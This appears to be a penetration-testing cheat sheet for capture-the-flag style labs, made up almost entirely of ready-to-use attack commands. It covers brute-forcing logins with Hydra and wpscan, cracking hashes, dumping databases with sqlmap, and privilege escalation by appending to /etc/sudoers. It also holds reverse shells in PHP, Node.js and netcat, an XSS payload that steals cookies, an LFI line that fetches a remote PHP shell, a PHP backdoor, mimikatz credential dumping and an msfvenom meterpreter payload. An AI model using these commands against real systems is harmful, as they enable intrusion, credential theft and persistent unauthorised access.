# port scan
```
rustscan 127.0.0.1 -t 500 -b 1500 -- -A
```

```
sudo nmap -sS -T5 -A -f -v [RHOST] -Pn -o nmap.log
```

# enumeration
## directory
```
gobuster dir -u http://[RHOST] -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -t 50
```

```
gobuster dir -u http://[RHOST] -w /usr/share/dirb/wordlists/common.txt -t 50
```
## file
```
gobuster dir --wordlist /usr/share/dirb/wordlists/common.txt -u http://[RHOST]/ -x php,txt,html
```

```
gobuster dir -u http://[RHOST]-w /usr/share/seclists/Discovery/Web-Content/common.txt  -t 50 -x .txt,.html,.php
```

## vhost
```
gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://example.com/ -t 50
```
# zip
```
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt file.zip
```
# hash
## unix sha512crypt
```
hashcat -m 1800 hash /usr/share/wordlists/rockyou.txt
```

```
hashcat -m 1800 hash --show
```
## ntlm
```
hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt
```
## john
```
sudo zip2john backup.zip > hash
```

```
sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
## ssh
```
/usr/share/john/ssh2john.py id_rsa > hash
```
# remote desktop
```
rdesktop [RHOST]
```

```
xfreerdp /u:user /p:pass /v:[RHOST]
```

```
xfreerdp /d:domain /u:user /p:pass /v:[RHOST]
```

```
remmina
```
# cmd.exe
```
certutil -urlcache -f http://[LHOST]/file file
```

# hydra

## basic auth
```
hydra -l user -P /usr/share/wordlists/rockyou.txt -f [RHOST] http-get -t 16
```
## ftp
```
hydra -l user -P /usr/share/wordlists/rockyou.txt [RHOST] -t 4 ftp -V
```
## ssh
```
hydra -l user -P /usr/share/wordlists/rockyou.txt [RHOST] -t 4 ssh -V
```

```
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://<RSHOST>:<RPORT> -t 4 -V
```

## http-post-form
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt [RHOST] http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid" -V
```

### jenkins
```
hydra [RHOST] -s <PORT> -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P r/usr/share/wordlists/rockyou.txt
```
# mysql
```
mysql -h [RHOST] -uroot -p
```
## sqlmap
```
sqlmap -u http://[RHOST] --forms --batch --dump
```

```
sqlmap -r req.txt --batch --dump
```
# terminal
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
# smb
```
smbclient //10.10.157.172/Data
```

```
smbclient -L [RHOST] -U "user"
```
# wordpress
## enumerate users
```
wpscan --url http://[RHOST]/ --enumerate t --enumerate p --enumerate u
```

```
wpscan --url http://[RHOST] -e u
```
## all plugins
```
wpscan --url http://[RHOST] -e ap
```
## crack password
```
wpscan --url http://[RHOST] --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
```

# find
```
find / -perm -4000 2>/dev/null
```

```
find / -user user -perm -4000 -print 2>/dev/null
```

```
find / -user user -print 2>/dev/null
```

```
find / -perm -u=s -type f 2>/dev/null
```

```
find / 2>/dev/null | grep -i flag
```

```
find / -type f -user www-data
```

```
find / -type f -name root.txt 2>/dev/null
```

```
find / -type f -user root -perm -4000 -exec ls -ldb {} \; 2>>/dev/null
```
## find credential
```
find / -name *.txt 2>/dev/null
```

```
find / -type f -name "flag.*" 2>/dev/null
```

```
find / -type -f -name "*.log" 2>/dev/null
```

```
find / -type f -name "*.bak" 2>/dev/null
```
# ssh
## port forwarding
```
ssh -L 9001:127.0.0.1:9001 -i id_rsa user@[RHOST]
```
## authorization_keys
```
cat id_rsa.pub >> authorization_keys
```
## scp
```
scp -P 4444 tryhackme@10.10.1.46:/home/tryhackme/exploit /home/kali/tryhackme
```
# sudo
```
sudo -u#-1 /bin/bash
```
# cron
## crontab
```
cat /etc/crontab
```
# forensics

## steganography
```
steghide extract -sf file.jpg
```
# reverese shell
## tiny php reverese shell
```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'"); ?>
```

## nodejs
```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4242, "10.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

## netcat
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [LHOST] 4444 >/tmp/f
```
# xss
```
<script>alert(document.cookie)</script>
```

```
<script>document.location='http://[RHOST]/?cookie='+document.cookie</script>
```

# lfi
```
php://filter/convert.base64-encode/resource=index
```

```
<?php file_put_contents('php-reverse-shell.php',file_get_contents('http://[LHOST]/php-reverse-shell.php')); ?>
```

# powershell

```
powershell -ep bypass
```

## powerview
### share folder
```
Invoke-ShareFinder
```
### operating system
```
Get-NetComputer -fulldata | select operatingsystem
```
# mimikatz
```
privilege::debug
```

```
lsadump::lsa /patch
```
# msfvenom
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe
```
# windows

## metapreter
### mimikatz
```
meterpreter > load kiwi
```

## samdump2
```
python2 creddump7/pwdump.py SYSTEM SAM
```

# privilege escalation
```
getcap -r / 2>/dev/null
```

```
echo "user ALL=(ALL:ALL) ALL" >> /etc/sudoers;
```

```
echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers;
```
# docker
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
# backdoor
```
<?php system($_GET['cmd']);?>
```

# searchsploit
## copy current directory
```
searchsploit -m file
```

# ssh
```
ssh user@expample.com -t "bash --noprofile"
```